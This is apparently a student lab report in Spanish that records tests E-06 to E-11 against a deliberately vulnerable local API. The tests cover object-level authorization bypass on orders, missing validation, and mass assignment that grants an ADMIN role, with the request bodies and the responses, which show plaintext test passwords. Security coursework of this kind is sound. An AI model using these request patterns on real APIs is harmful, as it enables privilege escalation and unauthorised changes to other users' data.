# Resultados reales — E-06 a E-11

API vulnerable local: `http://localhost:8080`.

La aplicación vulnerable arrancó con los datos iniciales, pero sus contadores IDENTITY de H2 no avanzaron después de insertar explícitamente los IDs 1–3. El primer E-06 con la configuración original respondió `500` por intento de insertar el pedido con ID 1 ya ocupado. Para aislar las vulnerabilidades de API descritas por la práctica, se reiniciaron los contadores únicamente en la base H2 en memoria (`usuarios` desde 3 y `pedidos` desde 4), usando un archivo SQL temporal fuera del repositorio. No se modificó el código fuente original.

Postman tenía la sesión expirada, así que estas son transcripciones de respuestas HTTP tomadas directamente de la API local; no son capturas de pantalla de Postman.

## E-06 — BOLA de escritura

`POST /api/pedidos`, `X-User-Id: 1`

```json
{
  "descripcion": "Pedido inyectado a nombre de Beto",
  "monto": 99999.00,
  "fecha": "2026-11-11",
  "usuario": { "id": 2 }
}
```

**HTTP 200**

```json
{"id":4,"descripcion":"Pedido inyectado a nombre de Beto","monto":99999.0,"fecha":"2026-11-11","usuario":{"id":2,"nombre":"Beto","email":"beto@itson.mx","password":"beto12345","rol":"USER"}}
```

## E-07 — Validación de pedido

`POST /api/pedidos`, `X-User-Id: 1`; cuerpo con `descripcion: ""` y `monto: -500`.

**HTTP 200**

```json
{"id":5,"descripcion":"","monto":-500.0,"fecha":"2026-11-11","usuario":{"id":1,"nombre":"Ana","email":"ana@itson.mx","password":"ana12345","rol":"USER"}}
```

## E-08 — Mass Assignment de rol

`POST /api/usuarios`; se enviaron nombre, email, contraseña y `rol: ADMIN`.

**HTTP 201**

```json
{"id":3,"nombre":"Eva Atacante","email":"eva@atacante.mx","password":"clave12345","rol":"ADMIN"}
```

## E-08b — Intento de forzar ID

`POST /api/usuarios`; se envió `id: 999` para Mallory, junto con `rol: ADMIN`.

**HTTP 201**

```json
{"id":4,"nombre":"Mallory Atacante","email":"mallory@atacante.mx","password":"clave12345","rol":"ADMIN"}
```

El ID 999 no se conservó; se asignó el 4.

## E-09 — Verificación de ADMIN

`GET /api/usuarios/3`

**HTTP 200**

```json
{"id":3,"nombre":"Eva Atacante","email":"eva@atacante.mx","password":"clave12345","rol":"ADMIN"}
```

## E-09b — Listado de usuarios

`GET /api/usuarios`

**HTTP 200**

El listado devolvió Ana (ID 1), Beto (ID 2), Eva (ID 3, ADMIN) y Mallory (ID 4, ADMIN), con contraseñas en claro.

## E-10 — Validación de usuario

`POST /api/usuarios`; se enviaron nombre vacío, `email: "esto-no-es-un-correo"` y `password: "123"`.

**HTTP 201**

```json
{"id":5,"nombre":"","email":"esto-no-es-un-correo","password":"123","rol":"USER"}
```

## E-11 — Campo desconocido

`POST /api/usuarios`; se enviaron `esAdministrador: true` y `saldo: 1000000` además de los campos del modelo.

**HTTP 201**

```json
{"id":6,"nombre":"Campo Extra","email":"extra@prueba.mx","password":"clave12345","rol":"USER"}
```

La API aceptó el cuerpo y omitió los dos campos desconocidos de la respuesta.
